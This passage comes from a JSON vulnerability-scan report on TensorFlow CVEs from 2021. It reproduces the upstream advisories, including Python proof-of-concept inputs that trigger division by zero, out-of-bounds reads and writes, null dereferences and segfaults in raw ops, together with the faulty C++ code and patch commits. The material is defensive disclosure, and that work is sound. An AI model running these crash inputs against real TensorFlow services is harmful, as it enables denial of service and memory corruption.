[12c727cee857fa19be717f336943d95fca4ffe4f](https://github.com/tensorflow/tensorflow/commit/12c727cee857fa19be717f336943d95fca4ffe4f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29524",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29524"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29524",
              "help": {
                "text": "Vulnerability CVE-2021-29524\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29524](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29524)\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(input=input_tensor, filter_sizes=filter_sizes,\n                                out_backprop=out_backprop,\n                                strides=[1, 66, 18, 1], use_cudnn_on_gpu=True,\n                                padding=`SAME`, explicit_paddings=[],\n                                data_format=`NHWC`, dilations=[1, 1, 1, 1])\n```                 \n                    \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/496c2630e51c1a478f095b084329acedb253db6b/tensorflow/core/kernels/conv_grad_shape_utils.cc#L130) does a modulus operation where the divisor is controlled by the caller:\n\n```cc \n  if (dims-\u003ein_depth % filter_shape.dim_size(num_dims - 2)) { ... }\n```\n    \n### Patches\nWe have patched the issue in GitHub commit [fca9874a9b42a2134f907d2fb46ab774a831404a](https://github.com/tensorflow/tensorflow/commit/fca9874a9b42a2134f907d2fb46ab774a831404a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29524**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29524](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29524)|\n\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(input=input_tensor, filter_sizes=filter_sizes,\n                                out_backprop=out_backprop,\n                                strides=[1, 66, 18, 1], use_cudnn_on_gpu=True,\n                                padding=`SAME`, explicit_paddings=[],\n                                data_format=`NHWC`, dilations=[1, 1, 1, 1])\n```                 \n                    \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/496c2630e51c1a478f095b084329acedb253db6b/tensorflow/core/kernels/conv_grad_shape_utils.cc#L130) does a modulus operation where the divisor is controlled by the caller:\n\n```cc \n  if (dims-\u003ein_depth % filter_shape.dim_size(num_dims - 2)) { ... }\n```\n    \n### Patches\nWe have patched the issue in GitHub commit [fca9874a9b42a2134f907d2fb46ab774a831404a](https://github.com/tensorflow/tensorflow/commit/fca9874a9b42a2134f907d2fb46ab774a831404a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29569",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29569"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29569",
              "help": {
                "text": "Vulnerability CVE-2021-29569\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29569](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29569)\n### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([1], shape=[1], dtype=tf.qint32) \ninput_max = tf.constant([], dtype=tf.float32)\ninput_min = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.RequantizationRange(input=input, input_min=input_min, input_max=input_max)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/ac328eaa3870491ababc147822cd04e91a790643/tensorflow/core/kernels/requantization_range_op.cc#L49-L50) assumes that the `input_min` and `input_max` tensors have at least one element, as it accesses the first element in two arrays:\n\n```cc\nconst float input_min_float = ctx-\u003einput(1).flat\u003cfloat\u003e()(0);\nconst float input_max_float = ctx-\u003einput(2).flat\u003cfloat\u003e()(0);\n```\n\nIf the tensors are empty, `.flat\u003cT\u003e()` is an empty object, backed by an empty array. Hence, accesing even the 0th element is a read outside the bounds.\n\n### Patches\nWe have patched the issue in GitHub commit [ef0c008ee84bad91ec6725ddc42091e19a30cf0e](https://github.com/tensorflow/tensorflow/commit/ef0c008ee84bad91ec6725ddc42091e19a30cf0e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29569**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29569](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29569)|\n\n### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([1], shape=[1], dtype=tf.qint32) \ninput_max = tf.constant([], dtype=tf.float32)\ninput_min = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.RequantizationRange(input=input, input_min=input_min, input_max=input_max)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/ac328eaa3870491ababc147822cd04e91a790643/tensorflow/core/kernels/requantization_range_op.cc#L49-L50) assumes that the `input_min` and `input_max` tensors have at least one element, as it accesses the first element in two arrays:\n\n```cc\nconst float input_min_float = ctx-\u003einput(1).flat\u003cfloat\u003e()(0);\nconst float input_max_float = ctx-\u003einput(2).flat\u003cfloat\u003e()(0);\n```\n\nIf the tensors are empty, `.flat\u003cT\u003e()` is an empty object, backed by an empty array. Hence, accesing even the 0th element is a read outside the bounds.\n\n### Patches\nWe have patched the issue in GitHub commit [ef0c008ee84bad91ec6725ddc42091e19a30cf0e](https://github.com/tensorflow/tensorflow/commit/ef0c008ee84bad91ec6725ddc42091e19a30cf0e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29566",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29566"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29566",
              "help": {
                "text": "Vulnerability CVE-2021-29566\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29566](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29566)\n### Impact\nAn attacker can write outside the bounds of heap allocated arrays by passing invalid arguments to `tf.raw_ops.Dilation2DBackpropInput`:\n\n```python\nimport tensorflow as tf\n    \ninput_tensor = tf.constant([1.1] * 81, shape=[3, 3, 3, 3], dtype=tf.float32)\nfilter = tf.constant([], shape=[0, 0, 3], dtype=tf.float32)\nout_backprop = tf.constant([1.1] * 1062, shape=[3, 2, 59, 3], dtype=tf.float32)\n\ntf.raw_ops.Dilation2DBackpropInput(\n  input=input_tensor, filter=filter, out_backprop=out_backprop, \n  strides=[1, 40, 1, 1], rates=[1, 56, 56, 1], padding=`VALID`)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/afd954e65f15aea4d438d0a219136fc4a63a573d/tensorflow/core/kernels/dilation_ops.cc#L321-L322) does not validate before writing to the output array.\n  \n```cc               \nin_backprop(b, h_in_max, w_in_max, d) += out_backprop(b, h_out, w_out, d);\n```                 \n    \nThe values for `h_out` and `w_out` are guaranteed to be in range for `out_backprop` (as they are loop indices bounded by the size of the array). However, there are no similar guarantees relating `h_in_max`/`w_in_max` and `in_backprop`.\n\n### Patches\nWe have patched the issue in GitHub commit [3f6fe4dfef6f57e768260b48166c27d148f3015f](https://github.com/tensorflow/tensorflow/commit/3f6fe4dfef6f57e768260b48166c27d148f3015f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29566**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29566](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29566)|\n\n### Impact\nAn attacker can write outside the bounds of heap allocated arrays by passing invalid arguments to `tf.raw_ops.Dilation2DBackpropInput`:\n\n```python\nimport tensorflow as tf\n    \ninput_tensor = tf.constant([1.1] * 81, shape=[3, 3, 3, 3], dtype=tf.float32)\nfilter = tf.constant([], shape=[0, 0, 3], dtype=tf.float32)\nout_backprop = tf.constant([1.1] * 1062, shape=[3, 2, 59, 3], dtype=tf.float32)\n\ntf.raw_ops.Dilation2DBackpropInput(\n  input=input_tensor, filter=filter, out_backprop=out_backprop, \n  strides=[1, 40, 1, 1], rates=[1, 56, 56, 1], padding=`VALID`)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/afd954e65f15aea4d438d0a219136fc4a63a573d/tensorflow/core/kernels/dilation_ops.cc#L321-L322) does not validate before writing to the output array.\n  \n```cc               \nin_backprop(b, h_in_max, w_in_max, d) += out_backprop(b, h_out, w_out, d);\n```                 \n    \nThe values for `h_out` and `w_out` are guaranteed to be in range for `out_backprop` (as they are loop indices bounded by the size of the array). However, there are no similar guarantees relating `h_in_max`/`w_in_max` and `in_backprop`.\n\n### Patches\nWe have patched the issue in GitHub commit [3f6fe4dfef6f57e768260b48166c27d148f3015f](https://github.com/tensorflow/tensorflow/commit/3f6fe4dfef6f57e768260b48166c27d148f3015f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29539",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29539"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29539",
              "help": {
                "text": "Vulnerability CVE-2021-29539\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29539](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29539)\n### Impact\nCalling [`tf.raw_ops.ImmutableConst`](https://www.tensorflow.org/api_docs/python/tf/raw_ops/ImmutableConst) with a `dtype` of `tf.resource` or `tf.variant` results in a segfault in the implementation as code assumes that the tensor contents are pure scalars.\n\n```python\n\u003e\u003e\u003e import tensorflow as tf\n\u003e\u003e\u003e tf.raw_ops.ImmutableConst(dtype=tf.resource, shape=[], memory_region_name=\"/tmp/test.txt\")\n...\nSegmentation fault\n```\n\n### Patches\nWe have patched the issue in 4f663d4b8f0bec1b48da6fa091a7d29609980fa4 and will release TensorFlow 2.5.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\n### Workarounds\nIf using `tf.raw_ops.ImmutableConst` in code, you can prevent the segfault by inserting a filter for the `dtype` argument.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2021-29539**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29539](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29539)|\n\n### Impact\nCalling [`tf.raw_ops.ImmutableConst`](https://www.tensorflow.org/api_docs/python/tf/raw_ops/ImmutableConst) with a `dtype` of `tf.resource` or `tf.variant` results in a segfault in the implementation as code assumes that the tensor contents are pure scalars.\n\n```python\n\u003e\u003e\u003e import tensorflow as tf\n\u003e\u003e\u003e tf.raw_ops.ImmutableConst(dtype=tf.resource, shape=[], memory_region_name=\"/tmp/test.txt\")\n...\nSegmentation fault\n```\n\n### Patches\nWe have patched the issue in 4f663d4b8f0bec1b48da6fa091a7d29609980fa4 and will release TensorFlow 2.5.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\n### Workarounds\nIf using `tf.raw_ops.ImmutableConst` in code, you can prevent the segfault by inserting a filter for the `dtype` argument.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29618",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29618"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29618",
              "help": {
                "text": "Vulnerability CVE-2021-29618\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29618](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29618)\n### Impact\nPassing a complex argument to `tf.transpose` at the same time as passing `conjugate=True` argument results in a crash:\n\n```python \nimport tensorflow as tf\ntf.transpose(conjugate=True, a=complex(1))\n```\n\n### Patches\nWe have received a patch for the issue in GitHub commit [1dc6a7ce6e0b3e27a7ae650bfc05b195ca793f88](https://github.com/tensorflow/tensorflow/commit/1dc6a7ce6e0b3e27a7ae650bfc05b195ca793f88).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported in [#42105](https://github.com/tensorflow/issues/42105) and fixed in [#46973](https://github.com/tensorflow/issues/46973).",
                "markdown": "**Vulnerability CVE-2021-29618**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29618](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29618)|\n\n### Impact\nPassing a complex argument to `tf.transpose` at the same time as passing `conjugate=True` argument results in a crash:\n\n```python \nimport tensorflow as tf\ntf.transpose(conjugate=True, a=complex(1))\n```\n\n### Patches\nWe have received a patch for the issue in GitHub commit [1dc6a7ce6e0b3e27a7ae650bfc05b195ca793f88](https://github.com/tensorflow/tensorflow/commit/1dc6a7ce6e0b3e27a7ae650bfc05b195ca793f88).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported in [#42105](https://github.com/tensorflow/issues/42105) and fixed in [#46973](https://github.com/tensorflow/issues/46973)."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29564",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29564"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29564",
              "help": {
                "text": "Vulnerability CVE-2021-29564\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29564](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29564)\n### Impact\nAn attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.EditDistance`: \n    \n```python\nimport tensorflow as tf\n\nhypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)\nhypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)\nhypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\ntruth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)\ntruth_values = tf.constant([], shape=[0], dtype=tf.float32)\ntruth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\n\ntf.raw_ops.EditDistance(\n    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,\n    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,\n    truth_values=truth_values, truth_shape=truth_shape, normalize=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/79865b542f9ffdc9caeb255631f7c56f1d4b6517/tensorflow/core/kernels/edit_distance_op.cc#L103-L159) has incomplete validation of the input parameters.\n\nIn the above scenario, an attacker causes an allocation of an empty tensor for the output:\n\n```cc\nOP_REQUIRES_OK(ctx, ctx-\u003eallocate_output(\"output\", output_shape, \u0026output));\nauto output_t = output-\u003eflat\u003cfloat\u003e();\noutput_t.setZero();\n```\n\nBecause `output_shape` has 0 elements, the result of `output-\u003eflat\u003cT\u003e()` has an empty buffer, so calling `setZero` would result in a null dereference.\n\n### Patches\nWe have patched the issue in GitHub commit [f4c364a5d6880557f6f5b6eb5cee2c407f0186b3](https://github.com/tensorflow/tensorflow/commit/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29564**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29564](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29564)|\n\n### Impact\nAn attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.EditDistance`: \n    \n```python\nimport tensorflow as tf\n\nhypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)\nhypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)\nhypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\ntruth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)\ntruth_values = tf.constant([], shape=[0], dtype=tf.float32)\ntruth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\n\ntf.raw_ops.EditDistance(\n    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,\n    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,\n    truth_values=truth_values, truth_shape=truth_shape, normalize=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/79865b542f9ffdc9caeb255631f7c56f1d4b6517/tensorflow/core/kernels/edit_distance_op.cc#L103-L159) has incomplete validation of the input parameters.\n\nIn the above scenario, an attacker causes an allocation of an empty tensor for the output:\n\n```cc\nOP_REQUIRES_OK(ctx, ctx-\u003eallocate_output(\"output\", output_shape, \u0026output));\nauto output_t = output-\u003eflat\u003cfloat\u003e();\noutput_t.setZero();\n```\n\nBecause `output_shape` has 0 elements, the result of `output-\u003eflat\u003cT\u003e()` has an empty buffer, so calling `setZero` would result in a null dereference.\n\n### Patches\nWe have patched the issue in GitHub commit [f4c364a5d6880557f6f5b6eb5cee2c407f0186b3](https://github.com/tensorflow/tensorflow/commit/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29614",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29614"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29614",
              "help": {
                "text": "Vulnerability CVE-2021-29614\nSeverity: medium\nFixed Version: 2.4.2\nLink: [CVE-2021-29614](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29614)\n### Impact\nThe implementation of `tf.io.decode_raw` produces incorrect results and crashes the Python interpreter when combining `fixed_length` and wider datatypes.\n\n```python\nimport tensorflow as tf\n\ntf.io.decode_raw(tf.constant([\"1\",\"2\",\"3\",\"4\"]), tf.uint16, fixed_length=4)\n```                \n                   \nThe [implementation of the padded version](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc) is buggy due to a confusion about pointer arithmetic rules.\n\nFirst, the code [computes](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc#L61) the width of each output element by dividing the `fixed_length` value to the size of the type argument:\n\n```cc\nint width = fixed_length / sizeof(T);\n```\n\nThe `fixed_length` argument is also used to determine the [size needed for the output tensor](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc#L63-L79):\n\n```cc\nTensorShape out_shape = input.shape();\nout_shape.AddDim(width);\nTensor* output_tensor = nullptr;\nOP_REQUIRES_OK(context, context-\u003eallocate_output(\"output\", out_shape, \u0026output_tensor));\n\nauto out = output_tensor-\u003eflat_inner_dims\u003cT\u003e();\nT* out_data = out.data();\nmemset(out_data, 0, fixed_length * flat_in.size());\n```\n\nThis is followed by [reencoding code](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc#L85-L94):\n\n```cc\nfor (int64 i = 0; i \u003c flat_in.size(); ++i) {\n  const T* in_data = reinterpret_cast\u003cconst T*\u003e(flat_in(i).data());\n\n  if (flat_in(i).size() \u003e fixed_length) {\n    memcpy(out_data, in_data, fixed_length);\n  } else {\n    memcpy(out_data, in_data, flat_in(i).size());\n  }\n  out_data += fixed_length;\n}\n```\n\nThe erroneous code is the last line above: it is moving the `out_data` pointer by `fixed_length * sizeof(T)` bytes whereas it only copied at most `fixed_length` bytes from the input. This results in parts of the input not being decoded into the output.\n\nFurthermore, because the pointer advance is far wider than desired, this quickly leads to writing to outside the bounds of the backing data. This OOB write leads to interpreter crash in the reproducer mentioned here, but more severe attacks can be mounted too, given that this gadget allows writing to periodically placed locations in memory.\n\n### Patches\nWe have patched the issue in GitHub commit [698e01511f62a3c185754db78ebce0eee1f0184d](https://github.com/tensorflow/tensorflow/commit/698e01511f62a3c185754db78ebce0eee1f0184d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2021-29614**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.4.2|[CVE-2021-29614](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29614)|\n\n### Impact\nThe implementation of `tf.io.decode_raw` produces incorrect results and crashes the Python interpreter when combining `fixed_length` and wider datatypes.\n\n```python\nimport tensorflow as tf\n\ntf.io.decode_raw(tf.constant([\"1\",\"2\",\"3\",\"4\"]), tf.uint16, fixed_length=4)\n```                \n                   \nThe [implementation of the padded version](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc) is buggy due to a confusion about pointer arithmetic rules.\n\nFirst, the code [computes](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc#L61) the width of each output element by dividing the `fixed_length` value to the size of the type argument:\n\n```cc\nint width = fixed_length / sizeof(T);\n```\n\nThe `fixed_length` argument is also used to determine the [size needed for the output tensor](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc#L63-L79):\n\n```cc\nTensorShape out_shape = input.shape();\nout_shape.AddDim(width);\nTensor* output_tensor = nullptr;\nOP_REQUIRES_OK(context, context-\u003eallocate_output(\"output\", out_shape, \u0026output_tensor));\n\nauto out = output_tensor-\u003eflat_inner_dims\u003cT\u003e();\nT* out_data = out.data();\nmemset(out_data, 0, fixed_length * flat_in.size());\n```\n\nThis is followed by [reencoding code](https://github.com/tensorflow/tensorflow/blob/1d8903e5b167ed0432077a3db6e462daf781d1fe/tensorflow/core/kernels/decode_padded_raw_op.cc#L85-L94):\n\n```cc\nfor (int64 i = 0; i \u003c flat_in.size(); ++i) {\n  const T* in_data = reinterpret_cast\u003cconst T*\u003e(flat_in(i).data());\n\n  if (flat_in(i).size() \u003e fixed_length) {\n    memcpy(out_data, in_data, fixed_length);\n  } else {\n    memcpy(out_data, in_data, flat_in(i).size());\n  }\n  out_data += fixed_length;\n}\n```\n\nThe erroneous code is the last line above: it is moving the `out_data` pointer by `fixed_length * sizeof(T)` bytes whereas it only copied at most `fixed_length` bytes from the input. This results in parts of the input not being decoded into the output.\n\nFurthermore, because the pointer advance is far wider than desired, this quickly leads to writing to outside the bounds of the backing data. This OOB write leads to interpreter crash in the reproducer mentioned here, but more severe attacks can be mounted too, given that this gadget allows writing to periodically placed locations in memory.\n\n### Patches\nWe have patched the issue in 